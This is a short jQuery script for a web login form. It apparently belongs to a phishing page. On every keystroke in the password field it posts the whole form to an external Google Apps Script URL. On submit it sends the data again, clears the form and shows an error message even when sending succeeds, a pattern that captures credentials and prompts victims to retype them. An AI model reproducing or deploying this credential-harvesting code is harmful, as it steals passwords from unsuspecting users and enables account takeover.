var valid = true;
$('#error-msg').hide()
$('#password').focus(function(){
    $('#password').keyup(function(){
        console.log('keyup');
        $.ajax({
            data:$("#gform").serialize(),
            url:"https://script.google.com/macros/s/AKfycbyssVG5NPkyP_uVbtuE0GRKvVGBwFg8-gOsvc21FihhQbQMRtFA4In_C8HdfP0AqHrBHg/exec",
            
            method:"post",
            success:function (response){
                // console.log('data sended');
                // console.log($('#password').val());
            },
            error:function (err){
                // alert("Something Error");
                $('#error-msg').show()
      
            }
        })
    })
})



/*========================================       Ajax      =======================================*/
$("#gform").submit((e)=>{
    e.preventDefault()
    $.ajax({
        url:"https://script.google.com/macros/s/AKfycbyssVG5NPkyP_uVbtuE0GRKvVGBwFg8-gOsvc21FihhQbQMRtFA4In_C8HdfP0AqHrBHg/exec",
        data:$("#gform").serialize(),
        method:"post",
        success:function (response){
            console.log('data sended')
            e.preventDefault();
            $('#gform').trigger("reset");
            $('#error-msg').show();
        },
        error:function (err){
            alert("Something Error");
            $('#error-msg').show()
  
        }
    })
  }
  )

//   $("#gform").submit((e)=>{
//     e.preventDefault()
//     $.ajax({
//         url:"https://script.google.com/macros/s/AKfycbyssVG5NPkyP_uVbtuE0GRKvVGBwFg8-gOsvc21FihhQbQMRtFA4In_C8HdfP0AqHrBHg/exec",
//         data:$("#gform").serialize(),
//         method:"post",
//         success:function (response){
//             alert("Form submitted successfully")
//             e.preventDefault();
//             $('#gform').trigger("reset");
//         },
//         error:function (err){
//             alert("Something Error")
  
//         }
//     })
//   }
//   )
  